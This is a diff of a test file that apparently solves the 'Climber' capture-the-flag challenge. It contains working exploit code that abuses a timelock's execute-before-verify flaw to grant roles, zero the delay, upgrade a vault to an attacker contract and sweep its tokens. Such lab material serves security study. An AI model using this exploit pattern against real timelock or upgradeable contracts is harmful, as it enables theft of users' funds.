@@ -51,8 +51,30 @@ describe('[Challenge] Climber', function () {
         await this.token.transfer(this.vault.address, VAULT_TOKEN_BALANCE);
     });
 
-    it('Exploit', async function () {        
-        /** CODE YOUR EXPLOIT HERE */
+    it('Exploit', async function () {
+        // timelock verifies proposal after executing the operation. we can upgrade the vault by executing the follow operation:
+        // 1. grant proposer role to the vault so it can schedule an operation
+        // 2. decrease the update delay to 0 so the operation is ready to be executed as soon as it is scheduled
+        // 3. upgrade the vault to an arbitrary implementation that will schedule the proposal back to the timelock
+        //    so that getOperationState returns ReadyForExecution. This new implementation allows us to steal the funds.
+        const HackUpgradeFactory = await ethers.getContractFactory('HackUpgrade', attacker);
+        const hackUpgrade = await HackUpgradeFactory.deploy();
+
+        const propserRole = ethers.utils.solidityKeccak256(['string'], ['PROPOSER_ROLE']);
+
+        const grantRoleData = this.timelock.interface.encodeFunctionData('grantRole', [propserRole, this.vault.address]);
+        const updateDelayData = this.timelock.interface.encodeFunctionData('updateDelay', [0]);
+        const upgradeData = this.vault.interface.encodeFunctionData('upgradeTo', [hackUpgrade.address]);
+
+        await this.timelock.connect(attacker).execute(
+            [this.timelock.address, this.timelock.address, this.vault.address], // targets
+            [0, 0, 0], // values
+            [grantRoleData, updateDelayData, upgradeData], // datas,
+            ethers.utils.formatBytes32String('h4ck'), // salt
+        );
+
+        const hackedVault = await HackUpgradeFactory.attach(this.vault.address);
+        hackedVault.connect(attacker).sweep(this.token.address, attacker.address);
     });
 
     after(async function () {
